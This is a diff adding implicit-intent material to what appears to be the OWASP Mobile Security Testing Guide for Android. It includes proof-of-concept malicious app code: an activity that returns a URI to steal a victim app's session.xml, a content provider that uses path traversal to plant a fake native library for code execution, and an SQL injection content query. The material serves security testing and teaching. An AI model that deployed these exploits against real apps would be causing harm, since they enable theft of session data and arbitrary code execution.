@@ -239,7 +239,7 @@ Often while dealing with complex flows during app development, there are situati
 
 `PendingIntent` are most commonly used for [notifications](https://developer.android.com/develop/ui/views/notifications "Android Notifications"), [app widgets](https://developer.android.com/develop/ui/views/appwidgets/advanced#user-interaction "app widgets"), [media browser services](https://developer.android.com/guide/topics/media-apps/audio-app/building-a-mediabrowserservice "media browser services"), etc. When used for notifications, `PendingIntent` is used to declare an intent to be executed when a user performs an action with an application's notification. The notification requires a callback to the application to trigger an action when the user clicks on it.
 
-Internally, a `PendingIntent` object wraps a normal `Intent` object (referred as base intent) that will eventually be used to invoke an action. For example, the base intent specifies that an activity A should be started in an application. The receiving application of the `PendingIntent`, will unwrap and retrieve this base intent and invoke the activity A by calling the `PendingIntent.send()` function.
+Internally, a `PendingIntent` object wraps a normal `Intent` object (referred as base intent) that will eventually be used to invoke an action. For example, the base intent specifies that an activity A should be started in an application. The receiving application of the `PendingIntent`, will unwrap and retrieve this base intent and invoke the activity A by calling the `PendingIntent.send` function.
 
 A typical implementation for using `PendingIntent` is below:
 
@@ -269,6 +269,34 @@ There are certain security pitfalls when implementing `PendingIntent`s, which ar
 The most common case of `PendingIntent` attack is when a malicious application is able to intercept it.
 
 For further details, check the Android documentation on [using a pending intent](https://developer.android.com/guide/components/intents-filters#PendingIntent "using a pending intent").
+
+#### Implicit Intents
+
+An Intent is a messaging object that you can use to request an action from another application component. Although intents facilitate communication between components in a variety of ways, there are three basic use cases: starting an activity, starting a service, and delivering a broadcast.
+
+According to the [Android Developers Documentation](https://developer.android.com/guide/components/intents-filters#Types), Android provides two types of intents:
+
+- **Explicit intents** specify which application will satisfy the intent by providing either the target app's package name or a fully qualified component class name. Typically, you'll use an explicit intent to start a component in your own app, because you know the class name of the activity or service you want to start. For example, you might want to start a new activity in your app in response to a user action, or start a service to download a file in the background.
+
+  ```java
+  // Note the specification of a concrete component (DownloadActivity) that is started by the intent.
+  Intent downloadIntent = new Intent(this, DownloadActivity.class);
+  downloadIntent.setAction("android.intent.action.GET_CONTENT")
+  startActivityForResult(downloadIntent);
+  ```
+
+- **Implicit intents** do not name a specific component, but instead declare a general action to be performed that another app's component can handle. For example, if you want to show the user a location on a map, you can use an implicit intent to ask another capable app to show a specific location on a map. Another example is when the user clicks on an email address within an app, where the calling app does not want to specify a specific email app and leaves that choice up to the user.
+
+  ```java
+  // Developers can also start an activity by just setting an action that is matched by the intended app.
+  Intent downloadIntent = new Intent();
+  downloadIntent.setAction("android.intent.action.GET_CONTENT")
+  startActivityForResult(downloadIntent);
+  ```
+
+The use of implicit intents can lead to multiple security risks, e.g. if the calling app processes the return value of the implicit intent without proper verification or if the intent contains sensitive data, it can be accidentally leaked to unauthorized third-parties.
+
+You can refer to this [blog post](https://blog.oversecured.com/Interception-of-Android-implicit-intents/ "Interception of Android implicit intents"), [this article](https://wiki.sei.cmu.edu/confluence/display/android/DRD03-J.+Do+not+broadcast+sensitive+information+using+an+implicit+intent "DRD03-J. Do not broadcast sensitive information using an implicit intent") and [CWE-927](https://cwe.mitre.org/data/definitions/927.html "CWE-927: Use of Implicit Intent for Sensitive Communication") for more information about the mentioned problem, concrete attack scenarios and recommendations.
 
 ### Object Persistence
 
@@ -697,6 +725,143 @@ SQL injection can be exploited with the following command. Instead of getting th
 ```bash
 # content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
 ```
+
+## Testing Implicit Intents (MSTG-PLATFORM-2)
+
+### Overview
+
+When testing for [implicit intents](#implicit-intents) you need to check if they are vulnerable to injection attacks or potentially leaking sensitive data.
+
+### Static Analysis
+
+Inspect the Android Manifest and look for any `<intent>` signatures defined inside [<queries> blocks](https://developer.android.com/guide/topics/manifest/queries-element "Android queries") (which specify the set of other apps an app intends to interact with), check if it contains any system actions (e.g. `android.intent.action.GET_CONTENT`, `android.intent.action.PICK`, `android.media.action.IMAGE_CAPTURE`, etc.) and browse the source code for their occurrence.
+
+For example, the following `Intent` doesn't specify any concrete component, meaning that it's an implicit intent. It sets the action `android.intent.action.GET_CONTENT` to ask the user for input data and then the app starts the intent by `startActivityForResult` and specifying an image chooser.
+
+```java
+Intent intent = new Intent();
+intent.setAction("android.intent.action.GET_CONTENT");
+startActivityForResult(Intent.createChooser(intent, ""), REQUEST_IMAGE);
+```
+
+The app uses `startActivityForResult` instead of `startActivity`, indicating that it expects a result (in this case an image), so you should check how the return value of the intent is handled by looking for the `onActivityResult` callback. If the return value of the intent isn't properly validated, an attacker may be able to read arbitrary files or execute arbitrary code from the app's internal `/data/data/<appname>' storage. A full description of this type of attack can be found in the [following blog post](https://blog.oversecured.com/Interception-of-Android-implicit-intents " Current attacks on implicit intents").
+
+#### Case 1: Arbitrary File Read
+
+In this example we're going to see how an attacker can read arbitrary files from within the app's internal storage `/data/data/<appname>` due to the improper validation of the return value of the intent.
+
+The `performAction` method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to `getFileItemFromUri`. This method copies the file to a temp folder, which is usual if this file is displayed internally. But if the app stores the URI provided file in an external temp directory e.g by calling `getExternalCacheDir` or `getExternalFilesDir` an attacker can read this file if he sets the permission `android.permission.READ_EXTERNAL_STORAGE`.
+
+```java
+private void performAction(Action action){
+  ...
+  Uri data = intent.getData();
+  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {
+      ...
+  }
+}
+
+private FileItem getFileItemFromUri(Context, context, Uri uri){
+  String fileName = UriExtensions.getFileName(uri, context);
+  File file = new File(getExternalCacheDir(), "tmp");
+  file.createNewFile();
+  copy(context.openInputStream(uri), new FileOutputStream(file));
+  ...
+}
+```
+
+The following is the source of a malicious app that exploits the above vulnerable code.
+
+AndroidManifest.xml
+
+```xml
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+<application>
+  <activity android:name=".EvilContentActivity">
+      <intent-filter android:priority="999">
+          <action android:name="android.intent.action.GET_CONTENT" />
+          <data android:mimeType="*/*" />
+      </intent-filter>
+  </activity>
+</application>
+```
+
+EvilContentActivity.java
+
+```java
+public class EvilContentActivity extends Activity{
+  @Override
+  protected void OnCreate(@Nullable Bundle savedInstanceState){
+    super.OnCreate(savedInstanceState);
+    setResult(-1, new Intent().setData(Uri.parse("file:///data/data/<victim_app>/shared_preferences/session.xml")));
+    finish();
+  }
+}
+```
+
+If the user selects the malicious app to handle the intent, the attacker can now steal the `session.xml` file from the app's internal storage. In the previous example, the victim must explicitly select the attacker's malicious app in a dialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This would allow the attack to occur without any additional user interaction.
+
+The following code sample implements this automatic selection of the recipient. By specifying a priority in the malicious app's intent filter, the attacker can influence the selection sequence.
+
+```java
+Intent intent = new Intent("android.intent.action.GET_CONTENT");
+for(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {
+    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);
+    startActivityForResult(intent);
+    return;
+}
+```
+
+#### Case 2: Arbitrary Code Execution
+
+An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows `content://` and `file://` URLs.
+
+An attacker can implement a [`ContentProvider`](https://developer.android.com/reference/android/content/ContentProvider "Android ContentProvider") that contains `public Cursor query(...)` to set an arbitrary file (in this case *lib.so*), and if the victim loads this file from the content provider by executing `copy` the attacker's `ParcelFileDescriptor openFile(...)` method will be executed and return a malicious *fakelib.so*.
+
+AndroidManifest.xml
+
+```xml
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+<application>
+  <activity android:name=".EvilContentActivity">
+      <intent-filter android:priority="999">
+          <action android:name="android.intent.action.GET_CONTENT" />
+          <data android:mimeType="*/*" />
+      </intent-filter>
+  </activity>
+  <provider android:name=".EvilContentProvider" android:authorities="com.attacker.evil" android:enabled="true" android:exported="true"></provider>
+</application>
+```
+
+EvilContentProvider.java
+
+```java
+public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
+    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
+    matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
+    return matrixCursor;
+}
+public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
+    return ParcelFileDescriptor.open(new File("/data/data/com.attacker/fakelib.so"), ParcelFileDescriptor.MODE_READ_ONLY);
+}
+```
+
+EvilContentActivity.java
+
+```java
+public class EvilContentActivity extends Activity{
+  @Override
+  protected void OnCreate(@Nullable Bundle savedInstanceState){
+    super.OnCreate(savedInstanceState);
+    setResult(-1, new Intent().setData(Uri.parse("content:///data/data/com.attacker/fakelib.so")));
+    finish();
+  }
+}
+```
+
+### Dynamic Analysis
+
+A convenient way to dynamically test for implicit intents, especially to identify potentially leaked sensitive data, is to use Frida or frida-trace and hook the `startActivityForResult` and `onActivityResult` methods and inspect the provided intents and the data they contain.
 
 ## Testing for URL Loading in WebViews (MSTG-PLATFORM-2)
 
